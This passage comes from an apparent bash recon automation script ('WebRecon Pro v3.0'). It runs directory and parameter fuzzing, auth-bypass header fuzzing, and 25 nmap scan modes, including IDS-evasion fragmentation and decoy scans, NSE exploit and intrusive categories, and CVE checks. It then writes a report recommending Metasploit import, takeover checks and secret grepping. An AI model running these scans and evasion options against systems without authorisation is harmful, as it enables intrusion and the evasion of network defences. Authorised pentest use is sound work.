                [ -s "$ft" ] && { log_ok "dirsearch default: $(safe_wc "$ft") results"; register_output "$ft" "dirsearch: built-in + extensions" "Good CMS path coverage"; }
            fi

            if confirm "dirsearch Mode 2: Custom medium wordlist" y; then
                local _wl="$WL_DIRS_MEDIUM"
                ask "Wordlist" "$WL_DIRS_MEDIUM" _wl
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_dirsearch_custom_${TS}.txt"
                    timeout 3600 python3 "$DIRSEARCH_PATH" \
                        -u "$TURL" -w "$_wl" -e php,asp,html,js,txt \
                        --plain-text-report="$ft" -q \
                        >> "$LOG_FILE" 2>&1 || true
                    [ -s "$ft" ] && { log_ok "dirsearch custom: $(safe_wc "$ft") results"; register_output "$ft" "dirsearch: custom wordlist" "Broader coverage"; }
                fi
            fi

            if confirm "dirsearch Mode 3: API paths" n; then
                local ft="$outdir/${t_safe}_dirsearch_api_${TS}.txt"
                local _wl="$WL_API"
                [ -f "$_wl" ] || _wl="$WL_DIRS_SMALL"
                if [ -f "$_wl" ]; then
                    timeout 1800 python3 "$DIRSEARCH_PATH" \
                        -u "$TURL" -w "$_wl" \
                        --plain-text-report="$ft" -q \
                        >> "$LOG_FILE" 2>&1 || true
                    [ -s "$ft" ] && { log_ok "dirsearch API: $(safe_wc "$ft") results"; register_output "$ft" "dirsearch: API paths" "REST API route discovery"; }
                fi
            fi
        else
            log_skip "dirsearch not found"
        fi

        # ── WFUZZ ─────────────────────────────────────────────────────────
        if check_tool "$WFUZZ_PATH"; then
            subsection "WFUZZ"

            if confirm "wfuzz Mode 1: Basic directory brute (hide 404)" y; then
                local _wl="$WL_DIRS_SMALL"
                [ -f "$_wl" ] || _wl="$WL_WFUZZ"
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_wfuzz_dir_basic_${TS}.txt"
                    timeout 3600 "$WFUZZ_PATH" -w "$_wl" --hc 404 \
                        -c -t "$T" "${TURL}/FUZZ" \
                        > "$ft" 2>>"$LOG_FILE" || true
                    [ -s "$ft" ] && { log_ok "wfuzz basic: $(safe_wc "$ft") results"; register_output "$ft" "wfuzz: basic dir (hide 404)" "Classic wfuzz scan"; }
                else
                    log_warn "wfuzz wordlist not found"
                fi
            fi

            if confirm "wfuzz Mode 2: Parameter value fuzzing" n; then
                local _path="/?id=FUZZ"
                ask "URL path + param to fuzz (e.g. /?id=FUZZ)" "/?id=FUZZ" _path
                local _wl="$WL_WFUZZ"
                [ -f "$_wl" ] || _wl="$WL_DIRS_SMALL"
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_wfuzz_paramfuzz_${TS}.txt"
                    timeout 1800 "$WFUZZ_PATH" -w "$_wl" --hc 404 \
                        -c -t "$T" "${TURL}${_path}" \
                        > "$ft" 2>>"$LOG_FILE" || true
                    [ -s "$ft" ] && { log_ok "wfuzz param fuzz: $(safe_wc "$ft") results"; register_output "$ft" "wfuzz: param value fuzz" "IDOR/injection on specific params"; }
                fi
            fi

            if confirm "wfuzz Mode 3: HTTP header fuzzing" n; then
                local _wl="$WL_DIRS_SMALL"
                [ -f "$_wl" ] && {
                    local ft="$outdir/${t_safe}_wfuzz_headerfuzz_${TS}.txt"
                    timeout 1800 "$WFUZZ_PATH" -w "$_wl" --hc 404 \
                        -c -t "$T" -H "X-Custom-IP-Authorization: FUZZ" \
                        "${TURL}/" > "$ft" 2>>"$LOG_FILE" || true
                    [ -s "$ft" ] && { register_output "$ft" "wfuzz: header fuzzing" "Hidden functionality via headers"; }
                }
            fi
        else
            log_skip "wfuzz not found"
        fi

    done  # end TARGETS loop

    # ── Merge all dir results ─────────────────────────────────────────────
    section "DIRECTORY BRUTE MASTER MERGE"
    local dir_master="$outdir/${TARGET}_DIRECTORY_MASTER_${TS}.txt"
    find "$outdir" -name "*.txt" ! -name "*MASTER*" 2>/dev/null | \
        xargs grep -hE '^https?://' 2>/dev/null | \
        grep -oE 'https?://[^ ]+' | sort -u > "$dir_master" 2>/dev/null || true
    log_ok "DIRECTORY MASTER: $dir_master ($(safe_wc "$dir_master") unique paths)"
    register_output "$dir_master" "MASTER: all dir brute merged" "Browse + test 403 bypass + check admin paths"

    subsection "Phase 5 Summary"
    echo -e "  ${STAR} Total discovered paths : ${YELLOW}$(safe_wc "$dir_master")${NC}"
    echo -e "  ${INFO} Next                  : Nmap scanning (Phase 6)"
    divider
}
# PHASE 6 — NMAP COMPREHENSIVE SCANNING (25 scan types + NSE + CVE checks)
# =============================================================================
phase_nmap() {
    section "PHASE 6 — NMAP COMPREHENSIVE SCANNING"
    local outdir="$OUTPUT_DIR/06_nmap"
    mkdir -p "$outdir"

    if ! check_tool "$NMAP_PATH"; then
        log_skip "nmap not found at: $NMAP_PATH — skipping Phase 6"
        return
    fi

    local nmap_bin
    nmap_bin=$(command -v nmap 2>/dev/null || echo "$NMAP_PATH")
    local IS_ROOT=0
    [ "$EUID" -eq 0 ] && IS_ROOT=1
    [ "$IS_ROOT" -eq 0 ] && log_warn "Not running as root — SYN/UDP/OS scans fall back to TCP connect. Use sudo for full capability."

    # Resolve IP
    local target_ip
    target_ip=$(dig +short "$TARGET" 2>/dev/null | grep -E '^[0-9.]+' | head -1 || echo "")
    [ -z "$target_ip" ] && target_ip="$TARGET"
    log_info "Target: $TARGET  |  Resolved IP: $target_ip"

    echo
    echo -e "  ${YELLOW}[1]${NC} Domain : ${WHITE}$TARGET${NC}"
    echo -e "  ${YELLOW}[2]${NC} IP     : ${WHITE}$target_ip${NC}"
    echo -e "  ${YELLOW}[3]${NC} Custom (CIDR/range)"
    echo -ne "  ${WHITE}Nmap target [1]: ${NC}"
    local _nc; read -r _nc || _nc=1
    local NMAP_TGT="$TARGET"
    case "${_nc:-1}" in
        2) NMAP_TGT="$target_ip" ;;
        3) ask "Enter nmap target" "$TARGET" NMAP_TGT ;;
    esac

    # ── nmap_run helper: always outputs .txt .xml .gnmap, never crashes ──
    nmap_run() {
        local label="$1"
        local basename="$2"
        shift 2
        local args=("$@")
        local out="$outdir/${TARGET}_nmap_${basename}_${TS}"
        log_run "Nmap [$label]: nmap ${args[*]} $NMAP_TGT"
        timeout 1200 "$nmap_bin" "${args[@]}" \
            -oN "${out}.txt" -oX "${out}.xml" -oG "${out}.gnmap" \
            "$NMAP_TGT" >> "$LOG_FILE" 2>&1 || true
        local open_n
        open_n=$(grep -c "open" "${out}.txt" 2>/dev/null || echo 0)
        log_ok "Nmap [$label] → $open_n open lines → ${out}.txt"
        register_output "${out}.txt"   "nmap: $label (text)"     "Human-readable"
        register_output "${out}.xml"   "nmap: $label (XML)"      "xsltproc nmap.xsl file.xml > report.html"
        register_output "${out}.gnmap" "nmap: $label (grepable)" "grep 'open' file.gnmap"
    }

    # ── SCAN 1: Quick TCP Top-1000 ────────────────────────────────────────
    if confirm "Nmap Scan 1: Quick TCP top-1000 ports (-T4)" y; then
        if [ "$IS_ROOT" -eq 1 ]; then
            nmap_run "Quick-SYN-Top1000" "01_quick_syn_top1000" -sS -T4 --top-ports 1000 -Pn
        else
            nmap_run "Quick-TCP-Top1000" "01_quick_tcp_top1000" -sT -T4 --top-ports 1000 -Pn
        fi
    fi

    # ── SCAN 2: Full TCP all 65535 ports ─────────────────────────────────
    if confirm "Nmap Scan 2: Full TCP all 65535 ports (slow)" y; then
        log_warn "Full port scan can take 15–30 minutes"
        if [ "$IS_ROOT" -eq 1 ]; then
            nmap_run "Full-SYN-AllPorts" "02_full_syn_allports" -sS -T4 -p- -Pn --open
        else
            nmap_run "Full-TCP-AllPorts" "02_full_tcp_allports" -sT -T4 -p- -Pn --open
        fi
    fi

    # ── SCAN 3: Service + Version detection ───────────────────────────────
    if confirm "Nmap Scan 3: Service & version detection (-sV)" y; then
        nmap_run "ServiceVersion" "03_service_version" \
            -sT -sV --version-intensity 9 -T4 --top-ports 1000 -Pn
    fi

    # ── SCAN 4: OS detection ──────────────────────────────────────────────
    if confirm "Nmap Scan 4: OS fingerprinting (-O)" y; then
        if [ "$IS_ROOT" -eq 1 ]; then
            nmap_run "OS-Detect" "04_os_fingerprint" -sS -O -T4 --top-ports 500 -Pn
        else
            log_warn "OS detection needs root — running version scan instead"
            nmap_run "OS-Detect-NoRoot" "04_os_fingerprint" -sT -sV -T4 --top-ports 500 -Pn
        fi
    fi

    # ── SCAN 5: Aggressive -A ─────────────────────────────────────────────
    if confirm "Nmap Scan 5: Aggressive mode -A (OS+Ver+Scripts+Traceroute)" y; then
        log_warn "Aggressive scan is loud — confirm you have permission"
        nmap_run "Aggressive-A" "05_aggressive_A" -A -T4 --top-ports 1000 -Pn
    fi

    # ── SCAN 6: UDP top-100 ───────────────────────────────────────────────
    if confirm "Nmap Scan 6: UDP top-100 ports (-sU)" y; then
        if [ "$IS_ROOT" -eq 1 ]; then
            log_warn "UDP scan is slow — running top-100 only"
            nmap_run "UDP-Top100" "06_udp_top100" -sU -T4 --top-ports 100 -Pn
        else
            log_warn "UDP scan requires root — skipping"
        fi
    fi

    # ── SCAN 7: Combined SYN + UDP ────────────────────────────────────────
    if confirm "Nmap Scan 7: Combined TCP+UDP top-50 each" n; then
        if [ "$IS_ROOT" -eq 1 ]; then
            nmap_run "TCP-UDP-Top50" "07_combined_tcp_udp" -sS -sU -T4 --top-ports 50 -Pn
        else
            log_warn "Combined TCP+UDP needs root — skipping"
        fi
    fi

    # ── SCAN 8: Stealth FIN ───────────────────────────────────────────────
    if confirm "Nmap Scan 8: Stealth FIN scan (-sF)" n; then
        if [ "$IS_ROOT" -eq 1 ]; then
            nmap_run "Stealth-FIN" "08_stealth_fin" -sF -T2 --top-ports 500 -Pn
        else
            log_warn "FIN scan needs root — skipping"
        fi
    fi

    # ── SCAN 9: XMAS scan ─────────────────────────────────────────────────
    if confirm "Nmap Scan 9: XMAS scan (-sX) — FIN+PSH+URG" n; then
        if [ "$IS_ROOT" -eq 1 ]; then
            nmap_run "XMAS-Scan" "09_xmas" -sX -T2 --top-ports 500 -Pn
        else
            log_warn "XMAS scan needs root — skipping"
        fi
    fi

    # ── SCAN 10: NULL scan ────────────────────────────────────────────────
    if confirm "Nmap Scan 10: NULL scan (-sN) — no flags set" n; then
        if [ "$IS_ROOT" -eq 1 ]; then
            nmap_run "NULL-Scan" "10_null" -sN -T2 --top-ports 500 -Pn
        else
            log_warn "NULL scan needs root — skipping"
        fi
    fi

    # ── SCAN 11: Host discovery ping sweep ───────────────────────────────
    if confirm "Nmap Scan 11: Host discovery / ping sweep (-sn)" y; then
        nmap_run "HostDiscovery-Ping" "11_host_discovery" -sn -T4 -Pn
    fi

    # ── SCAN 12: ICMP echo + timestamp ───────────────────────────────────
    if confirm "Nmap Scan 12: ICMP echo + timestamp probes" n; then
        if [ "$IS_ROOT" -eq 1 ]; then
            nmap_run "ICMP-Echo-Timestamp" "12_icmp" -sn -PE -PP -T4 -Pn
        else
            log_warn "ICMP raw probes need root — skipping"
        fi
    fi

    # ── SCAN 13: NSE default scripts ─────────────────────────────────────
    if confirm "Nmap Scan 13: NSE default scripts (-sC)" y; then
        nmap_run "NSE-Default" "13_nse_default" -sT -sC -T4 --top-ports 1000 -Pn
    fi

    # ── SCAN 14: NSE vuln scripts ─────────────────────────────────────────
    if confirm "Nmap Scan 14: NSE vuln scripts (--script vuln)" y; then
        log_warn "--script vuln can trigger IDS/WAF"
        nmap_run "NSE-Vuln" "14_nse_vuln" -sT --script vuln -T4 --top-ports 500 -Pn
    fi

    # ── SCAN 15: NSE safe scripts ─────────────────────────────────────────
    if confirm "Nmap Scan 15: NSE safe scripts (--script safe)" y; then
        nmap_run "NSE-Safe" "15_nse_safe" -sT --script safe -T4 --top-ports 1000 -Pn
    fi

    # ── SCAN 16: HTTP-specific NSE scripts ───────────────────────────────
    if confirm "Nmap Scan 16: HTTP-specific NSE scripts" y; then
        nmap_run "NSE-HTTP" "16_nse_http" \
            -sT -p 80,443,8080,8443,8888 \
            --script "http-*" -T4 -Pn
    fi

    # ── SCAN 17: SSL/TLS analysis ─────────────────────────────────────────
    if confirm "Nmap Scan 17: SSL/TLS cert + cipher analysis" y; then
        nmap_run "SSL-TLS" "17_ssl_tls" \
            -sT -p 443,8443,465,993,995,4443 \
            --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-dh-params \
            -T4 -Pn
    fi

    # ── SCAN 18: SMB / Windows ────────────────────────────────────────────
    if confirm "Nmap Scan 18: SMB / Windows service enumeration" n; then
        nmap_run "SMB-Windows" "18_smb_windows" \
            -sT -p 135,139,445,3389 \
            --script smb-enum-shares,smb-enum-users,smb-os-discovery \
            -T4 -Pn
    fi

    # ── SCAN 19: Web app NSE scripts ─────────────────────────────────────
    if confirm "Nmap Scan 19: Web app scripts (SQLi, XSS, git, shellshock)" y; then
        nmap_run "NSE-WebApp" "19_nse_webapp" \
            -sT -p 80,443,8080,8443 \
            --script http-sql-injection,http-xssed,http-git,http-svn-enum,http-shellshock,http-backup-finder,http-config-backup,http-default-accounts \
            -T4 -Pn
    fi

    # ── SCAN 20: Firewall evasion — fragmented packets ────────────────────
    if confirm "Nmap Scan 20: Firewall evasion — fragmented packets (-f)" n; then
        if [ "$IS_ROOT" -eq 1 ]; then
            nmap_run "Evasion-Frag" "20_evasion_frag" -sS -f -T2 --top-ports 100 -Pn
        else
            log_warn "Packet fragmentation needs root — skipping"
        fi
    fi

    # ── SCAN 21: Decoy scan ───────────────────────────────────────────────
    if confirm "Nmap Scan 21: Decoy scan (-D RND:10)" n; then
        if [ "$IS_ROOT" -eq 1 ]; then
            nmap_run "Decoy" "21_decoy" -sS -D RND:10 -T3 --top-ports 100 -Pn
        else
            log_warn "Decoy scan needs root — skipping"
        fi
    fi

    # ── SCAN 22: Paranoid timing (T0) ────────────────────────────────────
    if confirm "Nmap Scan 22: Paranoid timing (-T0) — ultra stealth, very slow" n; then
        if [ "$IS_ROOT" -eq 1 ]; then
            log_warn "T0 = 1 packet per 5 min — only top-20 ports"
            nmap_run "Paranoid-T0" "22_paranoid_t0" -sS -T0 --top-ports 20 -Pn
        else
            nmap_run "Sneaky-T1" "22_sneaky_t1" -sT -T1 --top-ports 20 -Pn
        fi
    fi

    # ── SCAN 23: Banner grabbing ──────────────────────────────────────────
    if confirm "Nmap Scan 23: Banner grabbing — common service ports" y; then
        nmap_run "BannerGrab" "23_banner_grab" \
            -sT -sV --version-intensity 9 \
            -p 21,22,23,25,53,80,110,143,443,445,993,995,3306,3389,5432,5900,6379,8080,8443,27017 \
            --script banner -T4 -Pn
    fi

    # ── SCAN 24: Full version + default scripts on common ports ──────────
    if confirm "Nmap Scan 24: Version + default scripts on common ports" y; then
        nmap_run "Version-Scripts" "24_version_scripts" \
            -sT -sV -sC -T4 \
            -p 21,22,23,25,53,80,110,143,443,445,993,995,3306,3389,5432,5900,6379,8080,8443,27017 \
            -Pn
    fi

    # ── SCAN 25: MEGA comprehensive ───────────────────────────────────────
    if confirm "Nmap Scan 25: MEGA — full OS+Ver+Scripts+Vuln top-5000 (30-60 min)" n; then
        log_warn "This is the most comprehensive and loudest scan"
        if [ "$IS_ROOT" -eq 1 ]; then
            nmap_run "MEGA-Full" "25_MEGA_full" \
                -sS -sV -sC -O -A --script vuln,safe,default \
                --top-ports 5000 -T4 -Pn --reason --open
        else
            nmap_run "MEGA-TCP" "25_MEGA_tcp" \
                -sT -sV -sC -A --script safe,default \
                --top-ports 5000 -T4 -Pn --reason --open
        fi
    fi

    # ── NSE category scans ────────────────────────────────────────────────
    section "NSE CATEGORY SCANS"
    echo -e "  ${DIM}Select NSE categories to run (y/n each):${NC}"
    for cat in auth brute discovery malware; do
        if confirm "NSE category: '$cat'" n; then
            nmap_run "NSE-${cat}" "nse_cat_${cat}" \
                -sT --script "$cat" --top-ports 500 -Pn -T4
        fi
    done
    for cat in exploit intrusive fuzzer; do
        if confirm "NSE category: '$cat' (intrusive — use with care)" n; then
            log_warn "Category '$cat' may actively exploit or crash services"
            nmap_run "NSE-${cat}" "nse_cat_${cat}" \
                -sT --script "$cat" --top-ports 200 -Pn -T4
        fi
    done

    # ── Specific CVE checks ───────────────────────────────────────────────
    section "SPECIFIC CVE CHECKS"
    if confirm "CVE: EternalBlue MS17-010 (WannaCry) — port 445" n; then
        nmap_run "CVE-MS17-010" "cve_ms17_010" -sT -p 445 --script smb-vuln-ms17-010 -Pn
    fi
    if confirm "CVE: Shellshock CVE-2014-6271 — port 80/443" n; then
        nmap_run "CVE-Shellshock" "cve_shellshock" -sT -p 80,443,8080 --script http-shellshock -Pn
    fi
    if confirm "CVE: Heartbleed CVE-2014-0160 — port 443" n; then
        nmap_run "CVE-Heartbleed" "cve_heartbleed" -sT -p 443,465,993 --script ssl-heartbleed -Pn
    fi
    if confirm "CVE: POODLE SSL CVE-2014-3566 — port 443" n; then
        nmap_run "CVE-POODLE" "cve_poodle" -sT -p 443 --script ssl-poodle -Pn
    fi
    if confirm "CVE: Drupalgeddon CVE-2018-7600 — port 80/443" n; then
        nmap_run "CVE-Drupalgeddon" "cve_drupalgeddon" -sT -p 80,443 --script http-vuln-cve2018-7600 -Pn
    fi
    if confirm "CVE: MS08-067 (Conficker) — port 445" n; then
        nmap_run "CVE-MS08-067" "cve_ms08_067" -sT -p 445 --script smb-vuln-ms08-067 -Pn
    fi

    # ── HTML report ───────────────────────────────────────────────────────
    section "NMAP HTML REPORT"
    local xsl
    xsl=$(find /usr/share/nmap -name "nmap.xsl" 2>/dev/null | head -1 || echo "")
    if [ -n "$xsl" ]; then
        local html="$outdir/${TARGET}_nmap_HTML_REPORT_${TS}.html"
        local first_xml
        first_xml=$(find "$outdir" -name "*.xml" 2>/dev/null | head -1 || echo "")
        if [ -n "$first_xml" ] && [ -f "$first_xml" ]; then
            xsltproc "$xsl" "$first_xml" > "$html" 2>>"$LOG_FILE" || true
            [ -s "$html" ] && { log_ok "HTML Report: $html"; register_output "$html" "nmap: HTML report" "Open in browser: firefox $html"; }
        fi
    fi

    # ── Master open ports ─────────────────────────────────────────────────
    local nmap_master="$outdir/${TARGET}_NMAP_OPEN_PORTS_MASTER_${TS}.txt"
    find "$outdir" -name "*.txt" 2>/dev/null | xargs grep -h "open" 2>/dev/null | sort -u > "$nmap_master" || true
    log_ok "NMAP MASTER: $nmap_master ($(safe_wc "$nmap_master") open port lines)"
    register_output "$nmap_master" "MASTER: all nmap open ports" "db_import *.xml into Metasploit"

    subsection "Phase 6 Summary"
    echo -e "  ${STAR} Open port lines : ${YELLOW}$(safe_wc "$nmap_master")${NC}"
    echo -e "  ${INFO} XML files        : db_import ${outdir}/*.xml in msfconsole"
    echo -e "  ${INFO} HTML report      : $outdir/*HTML*.html"
    divider
}


# =============================================================================
# PHASE 7 — FINAL REPORT GENERATION
# =============================================================================
phase_report() {
    section "PHASE 7 — FINAL REPORT"
    local ts_now; ts_now=$(date '+%Y-%m-%d %H:%M:%S')
    local report="$OUTPUT_DIR/${TARGET}_FINAL_REPORT_${TS}.md"
    local stats="$OUTPUT_DIR/${TARGET}_SCAN_STATS_${TS}.txt"

    local sub_count live_count url_count param_count vuln_count port_count
    sub_count=$(safe_wc "$SUBDOMAIN_MASTER_FILE")
    live_count=$(safe_wc "$LIVE_HOSTS_FILE")
    url_count=$(safe_wc "$URL_MASTER_FILE")
    param_count=$(safe_wc "$PARAMETERIZED_URLS")
    vuln_count=$(find "$OUTPUT_DIR/04_vulns" -name "*VULN_MASTER*" 2>/dev/null | xargs safe_wc 2>/dev/null | head -1 || echo 0)
    port_count=$(find "$OUTPUT_DIR/06_nmap" -name "*MASTER*" 2>/dev/null | xargs safe_wc 2>/dev/null | head -1 || echo 0)

    cat > "$report" << REOF
# WebRecon Pro v3.0 — Final Reconnaissance Report

**Target:** \`${TARGET}\`
**Scan Date:** ${ts_now}
**Output Directory:** \`${OUTPUT_DIR}\`
**Log File:** \`${LOG_FILE}\`

---

## Summary Statistics

| Phase | Metric | Count |
|-------|--------|-------|
| Phase 1 — Subdomains | Unique subdomains found | ${sub_count} |
| Phase 2 — HTTP Probe | Live hosts detected | ${live_count} |
| Phase 3 — URL Harvest | Total URLs collected | ${url_count} |
| Phase 3 — URL Harvest | Parameterized URLs | ${param_count} |
| Phase 4 — Vuln Scan | Candidate findings | ${vuln_count} |
| Phase 6 — Nmap | Open port/service lines | ${port_count} |

---

## Phase Results

### Phase 1 — Subdomain Enumeration
- **Tools:** subfinder (5 modes), amass (5 modes), assetfinder (3 modes), sublist3r (5 modes), knockpy (2 modes), ffuf (2 modes)
- **Master file:** \`${SUBDOMAIN_MASTER_FILE:-N/A}\`
- **Individual results:** \`${OUTPUT_DIR}/01_subdomains/\`

### Phase 2 — HTTP Probing (httpx)
- **Tools:** httpx (10 modes: all-status, JSON, 200-only, 3xx, 401/403, 5xx, tech, HTTPS-only, custom-ports, follow-redirects)
- **Live hosts master:** \`${LIVE_HOSTS_FILE:-N/A}\`
- **Status code breakdown:** \`${OUTPUT_DIR}/02_httpx/by_status_code/\`

### Phase 3 — URL Harvesting
- **Tools:** gau (8 modes), gospider (5 modes)
- **URL master:** \`${URL_MASTER_FILE:-N/A}\`
- **Parameterized URLs:** \`${PARAMETERIZED_URLS:-N/A}\`

### Phase 4 — Vulnerability Scanning (qsreplace)
- **Classes tested:** XSS, SQLi, SSRF, Open Redirect, CMDi, LFI, SSTI, Log4Shell
- **Candidate file:** \`${OUTPUT_DIR}/04_vulns/*VULN_MASTER*\`
- ⚠️  **All findings require manual verification before reporting**

### Phase 5 — Directory Brute Force
- **Tools:** ffuf (7 modes), gobuster (4 modes), feroxbuster (3 modes), dirb (3 modes), dirsearch (3 modes), wfuzz (3 modes)
- **Master:** \`${OUTPUT_DIR}/05_directories/*MASTER*\`

### Phase 6 — Nmap Scanning
- **Scan types:** 25 scan types (Quick, Full TCP, SYN, UDP, FIN, XMAS, NULL, OS, Aggressive, ICMP, NSE Default, NSE Vuln, NSE Safe, HTTP, SSL/TLS, SMB, WebApp, Banner, Version+Scripts, MEGA) + NSE categories + CVE-specific checks
- **Open ports master:** \`${OUTPUT_DIR}/06_nmap/*MASTER*\`
- **HTML report:** \`${OUTPUT_DIR}/06_nmap/*HTML*\`

---

## Output File Structure

\`\`\`
${OUTPUT_DIR}/
├── RESULTS_INDEX.txt                   ← Every file explained
├── ${TARGET}_FINAL_REPORT_*.md         ← This report
├── ${TARGET}_errors_*.log              ← Error + debug log
├── 01_subdomains/
│   ├── *subfinder_*.txt                ← subfinder per mode
│   ├── *amass_*.txt                    ← amass per mode
│   ├── *assetfinder_*.txt              ← assetfinder per mode
│   ├── *sublist3r_*.txt                ← sublist3r per mode
│   ├── *knockpy_*.txt                  ← knockpy per mode
│   ├── *ffuf_subdomain_*.txt           ← ffuf subdomain brute
│   └── *ALL_SUBDOMAINS_MERGED*         ← MASTER
├── 02_httpx/
│   ├── *allcodes*.txt                  ← all status codes
│   ├── *200_ok*.txt                    ← 200 OK
│   ├── *redirects*.txt                 ← 3xx
│   ├── *auth_401_403*.txt              ← 401/403
│   ├── by_status_code/                 ← per-code split
│   └── *LIVE_HOSTS_MASTER*             ← MASTER
├── 03_urls/
│   ├── *gau_*.txt                      ← gau per mode
│   ├── *gospider_*.txt                 ← gospider per mode
│   ├── *URL_MASTER_ALL*                ← MASTER all URLs
│   ├── *URLs_with_params*              ← parameterized
│   └── *unique_paths*                  ← clean paths
├── 04_vulns/
│   ├── *XSS_reflected*                 ← XSS candidates
│   ├── *SQLi_errorbased*               ← SQLi candidates
│   ├── *SSRF*                          ← SSRF candidates
│   ├── *OpenRedirect*                  ← redirect candidates
│   ├── *CMDi_timebased*                ← CMDi candidates
│   ├── *LFI_PathTraversal*             ← LFI candidates
│   ├── *SSTI*                          ← SSTI candidates
│   ├── *Log4Shell_JNDI*                ← Log4Shell probe log
│   └── *VULN_MASTER*                   ← ALL merged
├── 05_directories/
│   ├── *ffuf_*.txt/json                ← ffuf (7 modes)
│   ├── *gobuster_*.txt                 ← gobuster (4 modes)
│   ├── *feroxbuster_*.txt              ← feroxbuster (3 modes)
│   ├── *dirb_*.txt                     ← dirb (3 modes)
│   ├── *dirsearch_*.txt                ← dirsearch (3 modes)
│   ├── *wfuzz_*.txt                    ← wfuzz (3 modes)
│   └── *DIRECTORY_MASTER*              ← ALL merged
└── 06_nmap/
    ├── *01_quick* through *25_MEGA*    ← per scan (.txt .xml .gnmap)
    ├── *nse_cat_*                      ← NSE categories
    ├── *cve_*                          ← CVE checks
    ├── *HTML_REPORT*.html              ← browser report
    └── *OPEN_PORTS_MASTER*             ← ALL merged
\`\`\`

---

## Recommended Next Steps

### 🔴 Immediate — High Priority
1. Review \`04_vulns/*VULN_MASTER*\` — confirm each finding in Burp Suite
2. Test all 403 paths in \`05_directories/*MASTER*\` for bypass techniques
3. Check \`06_nmap/*MASTER*\` for open ports → match against known CVEs
4. Monitor your SSRF/Log4Shell callback server for any late DNS hits

### 🟡 Medium Priority
5. Subdomain takeover — run \`subjack\` or \`nuclei -t takeovers/\` on \`${SUBDOMAIN_MASTER_FILE:-subs.txt}\`
6. Run \`nuclei\` on live hosts: \`nuclei -l ${LIVE_HOSTS_FILE:-hosts.txt} -severity medium,high,critical\`
7. JS analysis — extract endpoints from \`.js\` files in URL master
8. Parameter discovery — run \`arjun\` on \`${PARAMETERIZED_URLS:-params.txt}\`

### 🟢 Further Recon
9. Secret scanning — \`grep -iE 'token=|api_key=|secret=' ${URL_MASTER_FILE:-urls.txt}\`
10. Import nmap XML to Metasploit — \`db_import ${OUTPUT_DIR}/06_nmap/*.xml\`
11. Cloud asset check — S3/GCS/Azure blob enumeration
12. \`theHarvester\` for email/employee OSINT

---

## Useful One-Liners

\`\`\`bash
# Nuclei on live hosts
nuclei -l ${LIVE_HOSTS_FILE:-hosts.txt} -t ~/nuclei-templates/ -severity medium,high,critical -o nuclei_findings.txt

# Subjack takeover check
subjack -w ${SUBDOMAIN_MASTER_FILE:-subs.txt} -t 100 -timeout 30 -ssl -v -o takeover.txt

# Find JS files
grep -E '\.js($|\?)' ${URL_MASTER_FILE:-urls.txt} | sort -u > jsfiles.txt

# Secret leak check
grep -iE 'token=|api_key=|secret=|password=|auth=' ${URL_MASTER_FILE:-urls.txt}

# Metasploit import
msfconsole -q -x "db_import ${OUTPUT_DIR}/06_nmap/*.xml; hosts; services; exit"

# Convert nmap XML to HTML
for f in ${OUTPUT_DIR}/06_nmap/*.xml; do xsltproc \$f -o "\${f%.xml}.html"; done
\`\`\`

---
*WebRecon Pro v3.0 — $(date '+%Y-%m-%d %H:%M:%S') — Authorized Testing Only*
REOF

    log_ok "Final report: $report"

    # Stats file
    cat > "$stats" << SEOF
WebRecon Pro v3.0 — Scan Statistics
Target         : $TARGET
Completed      : $ts_now
Output         : $OUTPUT_DIR
Log            : $LOG_FILE
--------------------------------------------
Subdomains     : $sub_count
Live Hosts     : $live_count
Total URLs     : $url_count
Param URLs     : $param_count
Vuln Cands     : $vuln_count
Open Ports     : $port_count
--------------------------------------------
SEOF
    log_ok "Stats: $stats"
    register_output "$report" "FINAL: markdown recon report" "Read + share with team"
    register_output "$stats"  "FINAL: quick statistics"     "At-a-glance numbers"

    # Print final banner
    echo
    echo -e "${BG_GREEN}${WHITE}${BOLD}"
    echo "  ╔═══════════════════════════════════════════════════════╗"
    echo "  ║         WebRecon Pro v3.0 — SCAN COMPLETE !          ║"
    echo "  ╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "  ${STAR} Target        : ${YELLOW}${BOLD}${TARGET}${NC}"
    echo -e "  ${STAR} Output Dir    : ${WHITE}${OUTPUT_DIR}${NC}"
    echo -e "  ${STAR} Final Report  : ${GREEN}${report}${NC}"
    echo -e "  ${STAR} Results Index : ${GREEN}${OUTPUT_DIR}/RESULTS_INDEX.txt${NC}"
    echo -e "  ${STAR} Error Log     : ${WHITE}${LOG_FILE}${NC}"
    echo
    divider
    echo -e "  ${INFO} Subdomains: ${YELLOW}${sub_count}${NC} | Live Hosts: ${YELLOW}${live_count}${NC} | URLs: ${YELLOW}${url_count}${NC} | Vuln Candidates: ${RED}${vuln_count}${NC}"
    divider
    echo -e "${DIM}  All candidates require manual verification before filing any bug report.${NC}"
    echo
}

# =============================================================================
# POST-SCAN INTERACTIVE MENU
# =============================================================================
post_scan_menu() {
    while true; do
        section "POST-SCAN OPTIONS"
        echo -e "  ${YELLOW}[1]${NC} View final report"
        echo -e "  ${YELLOW}[2]${NC} View RESULTS_INDEX.txt"
        echo -e "  ${YELLOW}[3]${NC} List all output files"
        echo -e "  ${YELLOW}[4]${NC} Count total subdomains"
        echo -e "  ${YELLOW}[5]${NC} Show top 20 live hosts"
        echo -e "  ${YELLOW}[6]${NC} Show all vulnerability candidates"
        echo -e "  ${YELLOW}[7]${NC} Show all open nmap ports"
        echo -e "  ${YELLOW}[8]${NC} Show scan statistics"
        echo -e "  ${YELLOW}[9]${NC} Re-run a specific phase"
        echo -e "  ${YELLOW}[0]${NC} Exit"
        divider
        echo -ne "  ${WHITE}${BOLD}Choice [0-9]: ${NC}"
        local opt; read -r opt || opt=0

        case "${opt:-0}" in
            1)
                local rpt; rpt=$(find "$OUTPUT_DIR" -name "*FINAL_REPORT*" 2>/dev/null | head -1 || echo "")
                if [ -n "$rpt" ] && [ -f "$rpt" ]; then
                    cat "$rpt" | less
                else
                    log_warn "Report file not found"
                fi ;;
            2)
                local idx="$OUTPUT_DIR/RESULTS_INDEX.txt"
                [ -f "$idx" ] && column -t -s '|' "$idx" | less || log_warn "Index not found" ;;
            3)
                if command -v tree >/dev/null 2>&1; then
                    tree "$OUTPUT_DIR" -L 3 --filelimit 60 2>/dev/null || find "$OUTPUT_DIR" -maxdepth 3 | sort
                else
